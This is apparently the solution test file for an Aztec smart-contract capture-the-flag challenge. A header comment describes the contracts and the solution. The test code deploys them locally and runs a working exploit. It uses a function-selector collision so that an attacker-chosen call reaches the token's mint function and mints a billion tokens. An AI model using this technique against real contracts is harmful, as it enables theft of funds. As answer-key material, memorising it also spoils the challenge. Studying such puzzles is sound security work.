/*
 * The Observatory Challenge
 * =========================
 *
 * Setup
 * -----
 * Three contracts are deployed by the challenge organizer:
 *
 *   FlagEmitter    -- The standard flag registry. Only allowlisted challenges
 *                     can emit flags.
 *
 *   TheObservatory -- The challenge contract. A deep-space research station
 *                     monitoring SHK 6237885, a compact galaxy group in the
 *                     Shakhbazian catalog being consumed by a supermassive
 *                     black hole. Tracks mass readings in Solar Mass Units
 *                     (SMU). The Observatory is the SOLE MINTER of the SMU
 *                     token.
 *
 *   Token (SMU)    -- Standard Aztec token from aztec-standards. Minted
 *                     exclusively by the Observatory.
 *
 * Goal
 * ----
 * Call singularity() which requires:
 *   1. Three research badges (scan, spectrum, observe)
 *   2. 1,000,000,000 (1 billion) SMU burned from private balance
 *
 * The observe badge is only earned through retrieve(), which requires
 * completing the full satellite observation flow:
 *   observe_shk_6237885() -> satellite callback -> retrieve()
 *
 * How the Observatory works
 * -------------------------
 * scan(): Private. elapsed^2 SMU minted to private via Token.mint_to_private.
 *   Issues scan badge.
 *
 * spectrum(): Private. Reads wavelength from transient capsule.
 *   poseidon2(wavelength) % 1M SMU minted to private. Issues spectrum badge.
 *
 * observe_shk_6237885(satellite, mass_origin, flux_density): Private. Enqueues
 *   record_pending(key) THEN calls satellite.consume_shk_6237885(mass_origin,
 *   flux_density). The satellite must callback report_reading_shk_6237885(key,
 *   reading) anonymously in the same tx. Does NOT issue a badge.
 *
 * retrieve(satellite, mass_origin, mass): Private. Proves preimage of commitment
 *   H(caller, satellite, mass_origin). Mints mass via Token.mint_to_private.
 *   Issues observe badge. Enqueues verification that mass matches stored value.
 *
 * singularity(): Private. Burns SINGULARITY_MASS from caller's private balance,
 *   consumes all three badges, then finalizes in public (once-per-researcher).
 *
 * The vulnerability
 * -----------------
 * observe_shk_6237885() dispatches to a user-supplied satellite address using
 * consume_shk_6237885(Field, Field). This function has selector 0xf8f84119,
 * which is the same as mint_to_private((Field), u128) on the Token contract.
 *
 * Passing the TOKEN as the satellite: Observatory calls Token with selector
 * 0xf8f84119 -> dispatches to mint_to_private(solver, 1B). Observatory is
 * the minter -> auth passes -> 1B SMU minted in one call.
 *
 * Key knowledge for solvers
 * -------------------------
 * 1. Function selectors: Aztec computes 4-byte selectors via
 *    poseidon2_hash_bytes(signature) & 0xFFFFFFFF. Two functions with
 *    different signatures can share a selector (collision). Cross-contract
 *    calls dispatch by selector alone, so a collision lets one function
 *    impersonate another.
 *
 * 2. The collision: consume_shk_6237885(Field,Field) has selector 0xf8f84119
 *    -- the same as mint_to_private((Field), u128) on the Token contract.
 *    The Observatory uses Token.mint_to_private directly for scan/spectrum/
 *    retrieve, but observe_shk_6237885 dispatches via StellarInterface --
 *    the solver must discover that calling consume_shk_6237885 on the token
 *    triggers mint_to_private due to the selector collision.
 *
 * 3. Capsules: spectrum() reads a wavelength from a transient capsule.
 *    The solver must attach a Capsule(contract, slot, [data]) to the tx.
 *    The slot is the comptime global WAVELENGTH_SLOT (poseidon2_hash_bytes
 *    of "WAVELENGTH_SLOT").
 *
 * 4. Satellite callback flow: The observe badge requires the FULL protocol:
 *    observe_shk_6237885 -> satellite.consume_shk_6237885 -> anonymous
 *    callback to report_reading_shk_6237885 -> retrieve(). The solver must
 *    deploy a satellite contract that implements consume_shk_6237885 and
 *    calls back report_reading_shk_6237885 with hide_msg_sender=true.
 *
 * 5. Storage reads: To read observation_mass on-chain before calling
 *    retrieve(), Aztec's Map derives storage slots with a domain-separated
 *    hash: poseidon2_hash_with_separator([base_slot, key], DOM_SEP).
 *    Use deriveStorageSlotInMap() from @aztec/stdlib/hash -- NOT plain
 *    poseidon2Hash.
 *
 * Solution
 * --------
 * 1. scan() -> scan badge
 * 2. spectrum() with capsule -> spectrum badge
 * 3. Deploy real satellite, observe->callback->retrieve -> observe badge
 * 4. observe_shk_6237885(TOKEN, solver, 1B) -> collision mints 1B SMU
 * 5. singularity() -> burn 1B SMU + consume badges + emit flag
 */

import { describe, it, expect, beforeAll, afterAll } from "vitest";
import { EmbeddedWallet } from "@aztec/wallets/embedded";
import { registerInitialLocalNetworkAccountsInWallet } from "@aztec/wallets/testing";
import { createAztecNodeClient, waitForNode } from "@aztec/aztec.js/node";
import { AztecAddress } from "@aztec/aztec.js/addresses";
import { Fr } from "@aztec/aztec.js/fields";
import { Capsule } from "@aztec/stdlib/tx";
import { FlagEmitterContract } from "../../artifacts/FlagEmitter.ts";
import { TheObservatoryContract } from "../../artifacts/TheObservatory.ts";
import { TheObservatorySolverContract } from "../../artifacts/TheObservatorySolver.ts";
import { TokenContract } from "@defi-wonderland/aztec-standards/dist/src/artifacts/Token.js";
import { poseidon2Hash } from "@aztec/foundation/crypto/poseidon";
import { deriveStorageSlotInMap } from "@aztec/stdlib/hash";
import { fieldCompressedString } from "../../../scripts/lib/shared.ts";

const SINGULARITY_MASS = 1_000_000_000n;

// poseidon2_hash_bytes("WAVELENGTH_SLOT") -- matches the comptime global in the contract
const WAVELENGTH_SLOT = Fr.fromString(
  "0x1e3011eabe5c856685a64cee4fe305bae55533df11ad701ed5eb6b39d58a8efa",
);

describe("TheObservatory", () => {
  let wallet: EmbeddedWallet;
  let aztecNode: ReturnType<typeof createAztecNodeClient>;
  let deployer: AztecAddress;
  let solver: AztecAddress;
  let observatory: TheObservatoryContract;
  let emitter: FlagEmitterContract;
  let token: TokenContract;
  let satellite: TheObservatorySolverContract;

  beforeAll(async () => {
    aztecNode = createAztecNodeClient("http://localhost:8080", {});
    await waitForNode(aztecNode);
    wallet = await EmbeddedWallet.create(aztecNode, {
      pxeConfig: {
        dataDirectory: "pxe-ctf-observatory",
        proverEnabled: false,
      },
    });

    [deployer, solver] =
      await registerInitialLocalNetworkAccountsInWallet(wallet);

    // --- Deployer sets up the challenge ---

    ({ contract: emitter } = await FlagEmitterContract.deploy(
      wallet,
      deployer,
    ).send({ from: deployer }));

    ({ contract: observatory } = await TheObservatoryContract.deploy(
      wallet,
      emitter.address,
    ).send({ from: deployer }));

    await emitter.methods
      .set_challenge(
        observatory.address,
        fieldCompressedString("the-observatory"),
      )
      .send({ from: deployer });

    ({ contract: token } = await TokenContract.deployWithOpts(
      { wallet, method: "constructor_with_minter" as any },
      "SolarMassUnit000000000000000000",
      "SMU0000000000000000000000000000",
      0,
      observatory.address,
    ).send({ from: deployer }));

    await observatory.methods.calibrate(token.address).send({ from: deployer });

    // --- Solver deploys a real satellite for the legitimate observe flow ---

    ({ contract: satellite } = await TheObservatorySolverContract.deploy(
      wallet,
    ).send({ from: solver }));

    console.log("Observatory:", observatory.address.toString());
    console.log("Token:", token.address.toString());
    console.log("Satellite:", satellite.address.toString());
    console.log("Deployer:", deployer.toString());
    console.log("Solver:", solver.toString());
  });

  afterAll(async () => {
    await wallet.stop();
  });

  // --- Solver captures the flag ---

  it("step 1: scan -> scan badge", async () => {
    await observatory.methods.scan().send({ from: solver });
    console.log("Scan badge earned");
  });

  it("step 2: spectrum via capsule -> spectrum badge", async () => {
    const wavelengthCapsule = new Capsule(
      observatory.address,
      WAVELENGTH_SLOT,
      [new Fr(42)],
      observatory.address,
    );

    await observatory.methods
      .spectrum()
      .with({ capsules: [wavelengthCapsule] })
      .send({ from: solver });

    console.log("Spectrum badge earned");
  });

  it("step 3: legitimate observe flow -> observe badge", async () => {
    // observe_shk_6237885 -> satellite callback -> retrieve
    await observatory.methods
      .observe_shk_6237885(satellite.address, solver.toField(), new Fr(100))
      .send({ from: solver });

    console.log("Observe + callback completed in one tx");

    // Compute the commitment key: H(solver, satellite, solver)
    const key = await poseidon2Hash([
      new Fr(solver.toBigInt()),
      new Fr(satellite.address.toBigInt()),
      new Fr(solver.toBigInt()),
    ]);

    // Read stored mass using domain-separated map slot derivation
    const baseSlot = TheObservatoryContract.storage.observation_mass.slot;
    const derivedSlot = await deriveStorageSlotInMap(baseSlot, {
      toField: () => key,
    });
    const storedMassRaw = await aztecNode.getPublicStorageAt(
      "latest",
      observatory.address,
      derivedSlot,
    );
    const storedMass = storedMassRaw.toBigInt();
    console.log("On-chain observation mass:", storedMass, "SMU");

    // retrieve() proves the preimage, mints mass, issues observe badge
    await observatory.methods
      .retrieve(satellite.address, solver.toField(), storedMass)
      .send({ from: solver });

    console.log("Observe badge earned via retrieve");
  });

  it("step 4: exploit -- observe token as satellite -> 1B SMU", async () => {
    // THE SELECTOR COLLISION:
    // consume_shk_6237885(Field,Field) == mint_to_private((Field),u128) == 0xf8f84119
    await observatory.methods
      .observe_shk_6237885(
        token.address,
        solver.toField(),
        new Fr(SINGULARITY_MASS),
      )
      .send({ from: solver });

    console.log(`Minted ${SINGULARITY_MASS} SMU via selector collision`);
  });

  it("step 5: singularity -> flag captured", async () => {
    await observatory.methods.singularity().send({ from: solver });
    console.log("SINGULARITY ACHIEVED -- FLAG CAPTURED");

    const captured = (
      await emitter.methods
        .is_captured(observatory.address, solver)
        .simulate({ from: solver })
    ).result;
    expect(captured).toBe(true);
  });
});
